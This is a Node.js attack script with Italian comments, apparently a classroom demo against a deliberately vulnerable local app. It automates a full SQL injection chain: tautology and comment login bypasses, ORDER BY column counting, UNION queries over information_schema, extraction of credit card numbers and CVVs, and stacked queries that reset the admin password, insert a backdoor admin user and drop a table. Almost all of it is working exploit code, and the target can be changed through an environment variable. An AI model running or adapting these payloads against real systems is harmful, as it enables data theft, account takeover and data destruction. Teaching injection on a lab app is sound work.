// attack.js
// script che lancia in automatico tutti i payload contro l'app (solo demo).
// fa le fasi in ordine, come farebbe uno che parte senza sapere lo schema.
// uso: docker compose exec web node attack.js   (oppure npm run attack)

const axios = require('axios');

const BASE = process.env.TARGET || 'http://localhost:3000';
const http = axios.create({ baseURL: BASE, maxRedirects: 0, validateStatus: () => true });

function titolo(t) {
  console.log('\n----- ' + t + ' -----');
}

// toglie i tag html dalla risposta cosi' la stampa e' leggibile
function clean(data) {
  return String(data).replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
}

async function login(username, password) {
  const body = new URLSearchParams({ username, password }).toString();
  return http.post('/login', body, {
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  });
}

async function search(cookie, payload) {
  return http.get('/search/result', { params: { user: payload }, headers: { Cookie: cookie } });
}

(async () => {
  console.log('target:', BASE);

  // 1) tautologia: entro senza credenziali
  titolo('FASE 1 - tautologia (login)');
  let payload = "' OR '1'='1' -- ";
  console.log('payload:', payload);
  let r = await login(payload, 'qualsiasi');
  const cookie = (r.headers['set-cookie'] || []).map((c) => c.split(';')[0]).join('; ');
  console.log('-> HTTP', r.status, 'redirect', r.headers.location, cookie ? '(dentro)' : '(fallito)');

  // 2) commento di fine riga: entro come admin saltando la password
  titolo('FASE 2 - commento di fine riga (login come admin)');
  payload = "admin' -- ";
  console.log('payload:', payload);
  r = await login(payload, 'password_a_caso');
  console.log('-> HTTP', r.status, 'redirect', r.headers.location);

  if (!cookie) {
    console.error('niente sessione, mi fermo qui.');
    process.exit(1);
  }

  // 3) quante colonne ha la query? provo con ORDER BY finche' non sballa
  titolo('FASE 3 - conto le colonne (ORDER BY)');
  for (const n of [5, 4, 3]) {
    const res = await search(cookie, `' ORDER BY ${n} -- `);
    console.log(`ORDER BY ${n} -> HTTP ${res.status} :: ${clean(res.data).slice(0, 120)}`);
  }
  console.log('quindi sono 3 colonne (con 4 va in errore, con 3 no).');

  // 4) versione db, utente con cui giro, nome del database
  titolo('FASE 4 - versione / utente / database');
  payload = "' UNION SELECT @@version, current_user(), database() -- ";
  console.log('payload:', payload);
  let res = await search(cookie, payload);
  console.log('->', clean(res.data));

  // 5) che tabelle ci sono? le chiedo a information_schema
  titolo('FASE 5 - elenco tabelle (information_schema)');
  payload = "' UNION SELECT table_name, table_schema, 1 FROM information_schema.tables WHERE table_schema = database() -- ";
  console.log('payload:', payload);
  res = await search(cookie, payload);
  console.log('->', clean(res.data));
  console.log('salta fuori carte_credito, che prima non sapevo esistesse.');

  // 6) e che colonne ha carte_credito?
  titolo('FASE 6 - colonne di carte_credito');
  payload = "' UNION SELECT column_name, data_type, 1 FROM information_schema.columns WHERE table_name = 'carte_credito' -- ";
  console.log('payload:', payload);
  res = await search(cookie, payload);
  console.log('->', clean(res.data));

  // 7) tiro fuori i dati delle carte (esfiltrazione)
  titolo('FASE 7 - esfiltrazione carte_credito');
  payload = "' UNION SELECT numero, cvv, intestatario FROM carte_credito -- ";
  console.log('payload:', payload);
  res = await search(cookie, payload);
  console.log('->', clean(res.data));

  // 8) cambio la password di admin (piggyback UPDATE sul login)
  titolo('FASE 8 - UPDATE password admin (piggyback)');
  payload = "x'; UPDATE users SET password = 'hacked123' WHERE username = 'admin'; -- ";
  console.log('payload:', payload);
  r = await login(payload, 'x');
  console.log('-> HTTP', r.status, 'redirect', r.headers.location);
  res = await search(cookie, 'admin');
  console.log('controllo admin:', clean(res.data));

  // 9) mi creo un utente backdoor
  titolo('FASE 9 - INSERT utente backdoor (piggyback)');
  payload = "x'; INSERT INTO users (username, password, ruolo) VALUES ('attacker', 'attackerpass', 'admin'); -- ";
  console.log('payload:', payload);
  r = await login(payload, 'x');
  console.log('-> HTTP', r.status, 'redirect', r.headers.location);
  res = await search(cookie, 'attacker');
  console.log('controllo:', clean(res.data));

  // 10) cancello la tabella delle carte (piggyback DROP)
  titolo('FASE 10 - DROP TABLE carte_credito (piggyback)');
  payload = "x'; DROP TABLE carte_credito; -- ";
  console.log('payload:', payload);
  r = await login(payload, 'x');
  console.log('-> HTTP', r.status, 'redirect', r.headers.location);
  console.log('riprovo a leggerla:');
  res = await search(cookie, "' UNION SELECT numero, cvv, intestatario FROM carte_credito -- ");
  console.log('-> HTTP', res.status, '::', clean(res.data));
  console.log('tabella sparita, i dati non si possono piu\' leggere.');

  console.log('\nfine. compromesse tutte e tre le proprieta CIA.');
})().catch((e) => {
  console.error('errore:', e.message);
  process.exit(1);
});
